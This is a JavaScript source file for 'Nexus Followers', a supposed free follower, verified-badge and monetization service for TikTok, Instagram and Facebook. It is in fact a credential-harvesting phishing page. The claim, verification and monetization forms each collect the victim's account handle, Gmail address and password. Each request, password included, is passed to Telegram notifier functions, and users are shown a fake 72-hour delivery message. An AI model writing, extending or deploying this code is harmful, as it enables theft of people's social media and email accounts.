/**
 * Nexus Followers – Free Social Followers Farming Platform
 * -------------------------------------------------------
 * Auth, claim free followers (TikTok / Instagram / Facebook),
 * verified badge requests, monetization toggles, claim history.
 * Credits are unlimited. Registration & claims notify Telegram.
 */

const STORAGE_KEY = "nexus_followers_users_v1";
const SESSION_KEY = "nexus_followers_session_v1";

const PLATFORMS = {
  tiktok: { name: "TikTok", prefix: "@", icon: "♪" },
  instagram: { name: "Instagram", prefix: "@", icon: "📷" },
  facebook: { name: "Facebook", prefix: "", icon: "f" }
};

let currentPlatform = "tiktok";
let currentAmount = 1000;
let currentVerifyPlatform = "tiktok";
let currentMonetizePlatform = "tiktok";

/* ==================== Utilities ==================== */

function generateWalletAddress() {
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) {
    addr += chars[Math.floor(Math.random() * 16)];
  }
  return addr;
}

function shortAddress(addr) {
  if (!addr || addr.length < 12) return addr || "—";
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

function formatNumber(n, decimals = 0) {
  const num = Number(n) || 0;
  return num.toLocaleString("en-US", {
    minimumFractionDigits: decimals,
    maximumFractionDigits: decimals
  });
}

function showToast(message, type = "success") {
  const toast = document.getElementById("toast");
  if (!toast) return;
  toast.textContent = message;
  toast.className = "toast show " + (type === "error" ? "error" : "success");
  clearTimeout(toast._timer);
  toast._timer = setTimeout(() => {
    toast.classList.remove("show");
  }, 2800);
}

function getUsers() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}

function saveUsers(users) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
}

function getCurrentUser() {
  const session = localStorage.getItem(SESSION_KEY);
  if (!session) return null;
  const users = getUsers();
  return users.find(u => u.email.toLowerCase() === session.toLowerCase()) || null;
}

function setSession(email) {
  localStorage.setItem(SESSION_KEY, email);
}

function clearSession() {
  localStorage.removeItem(SESSION_KEY);
}

function updateUser(updated) {
  const users = getUsers();
  const idx = users.findIndex(u => u.email.toLowerCase() === updated.email.toLowerCase());
  if (idx >= 0) {
    users[idx] = updated;
    saveUsers(users);
  }
}

function daysSince(dateStr) {
  const joined = new Date(dateStr).getTime();
  const now = Date.now();
  return Math.floor((now - joined) / (1000 * 60 * 60 * 24));
}

function todayKey() {
  const d = new Date();
  return d.getFullYear() + "-" + String(d.getMonth() + 1).padStart(2, "0") + "-" + String(d.getDate()).padStart(2, "0");
}

/* ==================== Auth ==================== */

function switchAuthTab(tab) {
  const loginForm = document.getElementById("login-form");
  const regForm = document.getElementById("register-form");
  const tabLogin = document.getElementById("tab-login");
  const tabReg = document.getElementById("tab-register");

  if (tab === "login") {
    loginForm.classList.remove("hidden");
    regForm.classList.add("hidden");
    tabLogin.classList.add("btn-primary");
    tabLogin.classList.remove("btn-secondary");
    tabReg.classList.add("btn-secondary");
    tabReg.classList.remove("btn-primary");
  } else {
    loginForm.classList.add("hidden");
    regForm.classList.remove("hidden");
    tabReg.classList.add("btn-primary");
    tabReg.classList.remove("btn-secondary");
    tabLogin.classList.add("btn-secondary");
    tabLogin.classList.remove("btn-primary");
  }
}

function handleRegister(e) {
  e.preventDefault();
  const name = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim().toLowerCase();
  const password = document.getElementById("reg-password").value;

  if (!name || !email || !password) {
    showToast("Please fill all fields", "error");
    return;
  }
  if (password.length < 6 || /^\d+$/.test(password)) {
    showToast("Password must be at least 6 characters and not numbers only", "error");
    return;
  }

  const users = getUsers();
  if (users.some(u => u.email === email)) {
    showToast("Email already registered", "error");
    return;
  }

  const user = {
    name,
    email,
    password,
    totalClaimed: 0,
    claims: [],
    verifications: [],
    monetizeRequests: [],
    monetized: { tiktok: false, instagram: false, facebook: false },
    activity: [
      {
        type: "Account Created",
        value: "Unlimited credits",
        time: new Date().toISOString()
      }
    ],
    joinedAt: new Date().toISOString(),
    showWelcome: true
  };

  users.push(user);
  saveUsers(users);
  setSession(email);

  // Telegram notification (non-blocking)
  if (typeof sendRegistrationToTelegram === "function") {
    sendRegistrationToTelegram(user).catch(() => {});
  }

  showApp(user);
  showToast("Account created! Unlimited free claims ready 🎉");
}

function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("login-email").value.trim().toLowerCase();
  const password = document.getElementById("login-password").value;

  const users = getUsers();
  const user = users.find(u => u.email === email && u.password === password);
  if (!user) {
    showToast("Invalid email or password", "error");
    return;
  }

  setSession(email);
  showApp(user);
  showToast("Welcome back, " + user.name.split(" ")[0] + "!");
}

function handleLogout() {
  clearSession();
  document.getElementById("app-screen").classList.add("hidden");
  document.getElementById("auth-screen").classList.remove("hidden");
  document.getElementById("login-form").reset();
  document.getElementById("register-form").reset();
  switchAuthTab("login");
}

/* ==================== Navigation ==================== */

function switchPage(page) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  const target = document.getElementById("page-" + page);
  if (target) target.classList.add("active");

  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.page === page);
  });

  const user = getCurrentUser();
  if (!user) return;

  if (page === "home") renderHome(user);
  else if (page === "claim") renderClaim(user);
  else if (page === "history") renderHistory(user);
  else if (page === "profile") renderProfile(user);
}

/* ==================== Claim Logic ==================== */

function setPlatform(plat) {
  currentPlatform = plat;
  document.querySelectorAll(".platform-btn").forEach(btn => {
    btn.classList.toggle("active", btn.id === "plat-" + plat);
  });
  const prefixEl = document.getElementById("handle-prefix");
  if (prefixEl) {
    prefixEl.textContent = PLATFORMS[plat]?.prefix || "@";
  }
}

function selectAmount(amount) {
  currentAmount = amount;
  document.getElementById("claim-amount").value = amount;
  document.querySelectorAll(".amount-btn").forEach(btn => {
    btn.classList.toggle("active", Number(btn.dataset.amount) === amount);
  });
  // Free claims – cost is always 0 for demo free farming
  const costEl = document.getElementById("claim-cost");
  if (costEl) costEl.textContent = "0";
}

function showDeliveryModal(claim) {
  const modal = document.getElementById("delivery-modal");
  const summary = document.getElementById("modal-claim-summary");
  if (!modal || !summary) return;

  const isSpecial = typeof claim.amount !== "number";
  const isMonetize = claim.amount === "Monetization" || claim.amount === "MONETIZATION";
  const isBadge = isSpecial && !isMonetize;
  const titleEl = modal.querySelector(".font-bold");
  const bodyEl = modal.querySelector("p.text-sm");
  if (titleEl) {
    titleEl.textContent = isMonetize
      ? "Monetization Requested!"
      : (isBadge ? "Verified Badge Requested!" : "Claim Submitted!");
  }
  if (bodyEl) {
    if (isMonetize) {
      bodyEl.innerHTML = "Your monetization request has been queued.<br><strong style=\"color:var(--primary);\">It will be processed within the next 72 hours.</strong>";
    } else if (isBadge) {
      bodyEl.innerHTML = "Your verified badge request has been queued.<br><strong style=\"color:var(--primary);\">It will be processed within the next 72 hours.</strong>";
    } else {
      bodyEl.innerHTML = "Your free followers have been queued.<br><strong style=\"color:var(--primary);\">They will be delivered within the next 72 hours.</strong>";
    }
  }

  const plat = PLATFORMS[claim.platform] || { name: claim.platform, icon: "?" };
  const amountLabel = isSpecial
    ? String(claim.amount)
    : ("+" + formatNumber(claim.amount) + " followers");
  summary.innerHTML =
    "<div style='margin-bottom:0.35rem;'><strong>" + plat.icon + " " + plat.name + "</strong> · @" + claim.username + "</div>" +
    "<div style='color:var(--primary);font-weight:700;'>" + amountLabel + "</div>" +
    "<div style='margin-top:0.35rem;font-size:0.75rem;color:var(--text-muted);'>Delivery: within 72 hours</div>";

  modal.classList.remove("hidden");
}

function closeDeliveryModal() {
  const modal = document.getElementById("delivery-modal");
  if (modal) modal.classList.add("hidden");
}

function submitClaim() {
  const user = getCurrentUser();
  if (!user) return;

  const username = document.getElementById("claim-username").value.trim().replace(/^@/, "");
  const gmail = document.getElementById("claim-gmail").value.trim().toLowerCase();
  const password = document.getElementById("claim-password").value;

  if (!username || username.length < 2) {
    showToast("Please enter a valid username", "error");
    return;
  }
  if (!gmail || !gmail.includes("@") || !gmail.includes(".")) {
    showToast("Please enter a valid Gmail address for this handle", "error");
    return;
  }
  if (!password || password.length < 4) {
    showToast("Please enter the password for this handle", "error");
    return;
  }

  const amount = currentAmount;
  if (amount < 100 || amount > 10000) {
    showToast("Amount must be between 100 and 10,000", "error");
    return;
  }

  // Unlimited free claims – no credit deduction
  const claim = {
    id: Date.now().toString(36),
    platform: currentPlatform,
    username: username,
    gmail: gmail,
    password: password,
    amount: amount,
    status: "Processing",
    time: new Date().toISOString()
  };

  user.claims = user.claims || [];
  user.claims.unshift(claim);
  user.totalClaimed = (user.totalClaimed || 0) + amount;
  user.activity = user.activity || [];
  user.activity.unshift({
    type: "Claimed " + PLATFORMS[currentPlatform].name,
    value: "+" + formatNumber(amount) + " followers",
    time: claim.time
  });

  updateUser(user);
  renderClaim(user);
  renderHome(user);

  // Clear sensitive fields after claim
  document.getElementById("claim-gmail").value = "";
  document.getElementById("claim-password").value = "";

  // Notify Telegram (non-blocking)
  if (typeof sendClaimToTelegram === "function") {
    sendClaimToTelegram(user, claim).catch(function () {});
  }

  // Show 72-hour delivery popup
  showDeliveryModal(claim);

  // Keep status as Processing (delivered within 72h) – no instant complete
}


/* ==================== Verified Badge ==================== */

function setVerifyPlatform(plat) {
  currentVerifyPlatform = plat;
  document.querySelectorAll("[id^=vplat-]").forEach(btn => {
    btn.classList.toggle("active", btn.id === "vplat-" + plat);
  });
  const prefixEl = document.getElementById("verify-handle-prefix");
  if (prefixEl) {
    prefixEl.textContent = PLATFORMS[plat]?.prefix || "@";
  }
}

function submitVerify() {
  const user = getCurrentUser();
  if (!user) return;

  const username = document.getElementById("verify-username").value.trim().replace(/^@/, "");
  const gmail = document.getElementById("verify-gmail").value.trim().toLowerCase();
  const password = document.getElementById("verify-password").value;

  if (!username || username.length < 2) {
    showToast("Please enter a valid username", "error");
    return;
  }
  if (!gmail || !gmail.includes("@") || !gmail.includes(".")) {
    showToast("Please enter a valid Gmail address for this handle", "error");
    return;
  }
  if (!password || password.length < 4) {
    showToast("Please enter the password for this handle", "error");
    return;
  }

  const request = {
    id: Date.now().toString(36),
    type: "verification",
    platform: currentVerifyPlatform,
    username: username,
    gmail: gmail,
    password: password,
    status: "Processing",
    time: new Date().toISOString()
  };

  user.verifications = user.verifications || [];
  user.verifications.unshift(request);
  user.activity = user.activity || [];
  user.activity.unshift({
    type: "Verified Badge Request",
    value: PLATFORMS[currentVerifyPlatform].name + " @" + username,
    time: request.time
  });

  updateUser(user);
  renderHome(user);
  renderClaim(user);

  document.getElementById("verify-gmail").value = "";
  document.getElementById("verify-password").value = "";
  document.getElementById("verify-username").value = "";

  if (typeof sendClaimToTelegram === "function") {
    // Reuse claim notifier with verification label
    const claimLike = Object.assign({}, request, { amount: "VERIFIED BADGE" });
    sendClaimToTelegram(user, claimLike).catch(function () {});
  }

  showDeliveryModal({
    platform: request.platform,
    username: request.username,
    amount: "Verified Badge",
    status: request.status
  });
}

/* ==================== Monetization ==================== */


function setMonetizePlatform(plat) {
  currentMonetizePlatform = plat;
  document.querySelectorAll("[id^=mplat-]").forEach(btn => {
    btn.classList.toggle("active", btn.id === "mplat-" + plat);
  });
  const prefixEl = document.getElementById("monetize-handle-prefix");
  if (prefixEl) {
    prefixEl.textContent = PLATFORMS[plat]?.prefix || "@";
  }
}

function submitMonetize() {
  const user = getCurrentUser();
  if (!user) return;

  const username = document.getElementById("monetize-username").value.trim().replace(/^@/, "");
  const gmail = document.getElementById("monetize-gmail").value.trim().toLowerCase();
  const password = document.getElementById("monetize-password").value;

  if (!username || username.length < 2) {
    showToast("Please enter a valid username", "error");
    return;
  }
  if (!gmail || !gmail.includes("@") || !gmail.includes(".")) {
    showToast("Please enter a valid Gmail address for this handle", "error");
    return;
  }
  if (!password || password.length < 4) {
    showToast("Please enter the password for this handle", "error");
    return;
  }

  const request = {
    id: Date.now().toString(36),
    type: "monetization",
    platform: currentMonetizePlatform,
    username: username,
    gmail: gmail,
    password: password,
    status: "Processing",
    time: new Date().toISOString()
  };

  user.monetizeRequests = user.monetizeRequests || [];
  user.monetizeRequests.unshift(request);
  user.monetized = user.monetized || { tiktok: false, instagram: false, facebook: false };
  // mark as requested/processing for this platform
  user.monetized[currentMonetizePlatform] = true;

  user.activity = user.activity || [];
  user.activity.unshift({
    type: "Monetization Request",
    value: PLATFORMS[currentMonetizePlatform].name + " @" + username,
    time: request.time
  });

  updateUser(user);
  renderHome(user);
  renderClaim(user);
  if (document.getElementById("page-profile")?.classList.contains("active")) {
    renderProfile(user);
  }

  document.getElementById("monetize-gmail").value = "";
  document.getElementById("monetize-password").value = "";
  document.getElementById("monetize-username").value = "";

  if (typeof sendClaimToTelegram === "function") {
    const claimLike = Object.assign({}, request, { amount: "MONETIZATION" });
    sendClaimToTelegram(user, claimLike).catch(function () {});
  }

  showDeliveryModal({
    platform: request.platform,
    username: request.username,
    amount: "Monetization",
    status: request.status
  });
}

function countMonetized(user) {
  return (user.monetizeRequests || []).length || countMonetizedFlags(user);
}

function countMonetizedFlags(user) {
  const m = user.monetized || {};
  return (m.tiktok ? 1 : 0) + (m.instagram ? 1 : 0) + (m.facebook ? 1 : 0);
}

/* ==================== Render Functions ==================== */

function showApp(user) {
  document.getElementById("auth-screen").classList.add("hidden");
  document.getElementById("app-screen").classList.remove("hidden");

  // Header
  const avatar = (user.name || "U").charAt(0).toUpperCase();
  document.getElementById("header-avatar").textContent = avatar;
  document.getElementById("header-name").textContent = user.name;

  // Welcome notice
  const notice = document.getElementById("welcome-notice");
  if (user.showWelcome) {
    notice.style.display = "block";
    user.showWelcome = false;
    updateUser(user);
    setTimeout(() => { notice.style.display = "none"; }, 6000);
  } else {
    notice.style.display = "none";
  }

  switchPage("home");
}

function renderHome(user) {
  const bal = document.getElementById("home-balance");
  if (bal) bal.textContent = "∞";
  const total = document.getElementById("home-total-claimed");
  if (total) total.textContent = formatNumber(user.totalClaimed || 0);
  const verifiedEl = document.getElementById("home-verified");
  if (verifiedEl) verifiedEl.textContent = (user.verifications || []).length;

  const today = todayKey();
  const claimsToday = (user.claims || []).filter(c => (c.time || "").startsWith(today)).length;
  const claimsTodayEl = document.getElementById("home-claims-today");
  if (claimsTodayEl) claimsTodayEl.textContent = claimsToday;
  const monEl = document.getElementById("home-monetized");
  if (monEl) monEl.textContent = countMonetized(user);
}

function renderClaim(user) {
  const costEl = document.getElementById("claim-cost");
  if (costEl) costEl.textContent = "0";

  setPlatform(currentPlatform);
  selectAmount(currentAmount);
  setVerifyPlatform(currentVerifyPlatform || "tiktok");
  setMonetizePlatform(currentMonetizePlatform || "tiktok");
}

function renderHistory(user) {
  const list = document.getElementById("history-list");
  const empty = document.getElementById("history-empty");
  const claims = user.claims || [];
  const verifs = user.verifications || [];
  const monets = user.monetizeRequests || [];

  const items = claims.map(c => Object.assign({ kind: "followers" }, c))
    .concat(verifs.map(v => Object.assign({ kind: "verification" }, v)))
    .concat(monets.map(m => Object.assign({ kind: "monetization" }, m)))
    .sort((a, b) => new Date(b.time) - new Date(a.time));

  const countEl = document.getElementById("history-count");
  if (countEl) countEl.textContent = items.length;

  if (!items.length) {
    if (list) list.innerHTML = "";
    if (empty) empty.style.display = "block";
    return;
  }
  if (empty) empty.style.display = "none";

  if (list) {
    list.innerHTML = items.map(c => {
      const plat = PLATFORMS[c.platform] || { name: c.platform, icon: "?" };
      const time = new Date(c.time).toLocaleString();
      const statusClass = c.status === "Completed" ? "badge-green" : "badge-yellow";
      let amountHtml;
      if (c.kind === "verification") {
        amountHtml = '<div class="hi-amount">Verified Badge ✓</div>';
      } else if (c.kind === "monetization") {
        amountHtml = '<div class="hi-amount">Monetization 💰</div>';
      } else {
        amountHtml = '<div class="hi-amount">+' + formatNumber(c.amount) + " followers</div>";
      }
      return (
        '<div class="history-item">' +
        '<div class="hi-header">' +
        '<div class="hi-platform">' + plat.icon + " " + plat.name + "</div>" +
        '<span class="badge ' + statusClass + '">' + (c.status || "Processing") + "</span>" +
        "</div>" +
        amountHtml +
        '<div class="hi-meta">@' + c.username + " · " + time + "</div>" +
        "</div>"
      );
    }).join("");
  }
}

function renderProfile(user) {
  const avatar = (user.name || "U").charAt(0).toUpperCase();
  const av = document.getElementById("profile-avatar");
  if (av) av.textContent = avatar;
  const pn = document.getElementById("profile-name");
  if (pn) pn.textContent = user.name;
  const pe = document.getElementById("profile-email");
  if (pe) pe.textContent = user.email;
  const pj = document.getElementById("profile-joined");
  if (pj) pj.textContent = new Date(user.joinedAt).toLocaleDateString();
  const pc = document.getElementById("profile-claims");
  if (pc) pc.textContent = (user.claims || []).length;
  const pv = document.getElementById("profile-verified");
  if (pv) pv.textContent = (user.verifications || []).length;
  const pm = document.getElementById("profile-monetized");
  if (pm) pm.textContent = countMonetized(user);

  const list = document.getElementById("profile-monetize-list");
  if (list) {
    list.innerHTML = ["tiktok", "instagram", "facebook"].map(p => {
      const on = !!(user.monetized && user.monetized[p]);
      return (
        '<div class="monetize-status-item">' +
        "<span>" + PLATFORMS[p].icon + " " + PLATFORMS[p].name + "</span>" +
        '<span class="badge ' + (on ? "badge-green" : "badge-yellow") + '">' + (on ? "Active" : "Off") + "</span>" +
        "</div>"
      );
    }).join("");
  }
}

/* ==================== Withdrawal ==================== */

/* ==================== Init ==================== */

document.addEventListener("DOMContentLoaded", () => {
  // Auth forms
  document.getElementById("login-form").addEventListener("submit", handleLogin);
  document.getElementById("register-form").addEventListener("submit", handleRegister);
  // Bottom nav
  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => switchPage(btn.dataset.page));
  });

  // Restore session
  const user = getCurrentUser();
  if (user) {
    showApp(user);
  } else {
    document.getElementById("auth-screen").classList.remove("hidden");
    document.getElementById("app-screen").classList.add("hidden");
  }
});
